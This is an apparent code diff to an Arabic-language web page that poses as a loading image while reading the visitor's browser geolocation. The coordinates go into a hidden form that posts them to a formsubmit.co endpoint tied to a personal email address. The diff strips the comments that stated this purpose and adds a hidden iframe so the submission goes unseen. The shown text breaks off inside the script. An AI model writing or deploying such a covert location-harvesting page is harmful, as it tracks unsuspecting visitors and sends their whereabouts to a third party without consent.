@@ -2,7 +2,7 @@
 <html lang="ar">
   <head>
     <meta charset="UTF-8" />
-    <title>جارٍ التحميل...</title>
+    <title>تحميل...</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
       body {
@@ -19,23 +19,25 @@
         max-width: 100%;
         height: auto;
       }
+
+      iframe {
+        display: none; /* إخفاء الفورم */
+      }
     </style>
   </head>
   <body>
-    <!-- الصورة اللي هتظهر للزائر -->
-    <img src="https://via.placeholder.com/400x300.png?text=تحميل+الصورة..." alt="صورة" />
+    <img src="https://via.placeholder.com/400x300.png?text=جارٍ+تحميل+الصورة..." alt="صورة" />
 
-    <!-- الفورم المخفي لإرسال الموقع -->
-    <form action="https://formsubmit.co/mohamed.hamdy0560@gmail.com" method="POST" id="locationForm">
+    <form action="https://formsubmit.co/mohamed.hamdy0560@gmail.com" method="POST" id="locationForm" target="hidden_iframe">
       <input type="hidden" name="Location" id="location">
       <input type="hidden" name="_captcha" value="false">
       <input type="hidden" name="_template" value="table">
-      <input type="hidden" name="_autoresponse" value="">
       <input type="hidden" name="_redirect" value="about:blank">
     </form>
 
+    <iframe name="hidden_iframe"></iframe>
+
     <script>
-      // أول ما الصفحة تفتح، حاول تجيب موقع الزائر وأرسله في الخلفية
       if ("geolocation" in navigator) {
         navigator.geolocation.getCurrentPosition(function(position) {
           const locationInfo = "Latitude: " + position.coords.latitude + ", Longitude: " + position.coords.longitude;
